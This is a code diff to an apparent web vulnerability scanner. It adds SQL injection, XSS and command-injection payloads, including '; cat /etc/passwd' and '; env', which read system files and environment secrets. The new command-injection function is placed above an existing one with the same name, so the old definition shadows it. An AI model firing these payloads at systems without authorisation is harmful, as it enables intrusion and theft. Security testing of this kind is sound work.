@@ -84,7 +84,14 @@ def is_sql_injection_vulnerable(url):
         "' OR 1=1 --",
         "' OR '1'='1",
         "' OR 'x'='x",
-        "' OR ''='"
+        "' OR ''='",
+        "' OR 1=1 LIMIT 1 --",
+        "' OR 1=1 #",
+        "' OR 1=1 /*",
+        "' OR 1=1 -- -",
+        "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL --",
+        "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL #",
+        "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL /*"
     ]
     for payload in payloads:
         response = requests.get(url + "?id=" + payload)
@@ -97,7 +104,13 @@ def is_xss_vulnerable(url):
         "<script>alert('XSS')</script>",
         "<img src=x onerror=alert('XSS')>",
         "<svg/onload=alert('XSS')>",
-        "javascript:alert('XSS')"
+        "javascript:alert('XSS')",
+        "<script>alert(/XSS/)</script>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "<script>eval(alert(/XSS/))</script>",
+        "<script>(alert)('XSS')</script>",
+        "<script>setTimeout(alert, 1000, 'XSS')</script>",
+        "<script>setInterval(alert, 1000, 'XSS')</script>"
     ]
     for payload in payloads:
         response = requests.get(url + "?input=" + payload)
@@ -105,6 +118,25 @@ def is_xss_vulnerable(url):
             return True
     return False
 
+def is_command_injection_vulnerable(url):
+    payloads = [
+        "; cat /etc/passwd",
+        "; ls",
+        "; pwd",
+        "; env",
+        "; uname -a",
+        "; whoami",
+        "; id",
+        "; ifconfig",
+        "; netstat -an",
+        "; ps -ef",
+        "; top"
+    ]
+    for payload in payloads:
+        response = requests.get(url + "?cmd=" + payload)
+        if re.search(r"root:x:", response.text):
+            return True
+    return False
 def is_command_injection_vulnerable(url):
     payload = "; cat /etc/passwd"
     response = requests.get(url + "?cmd=" + payload)
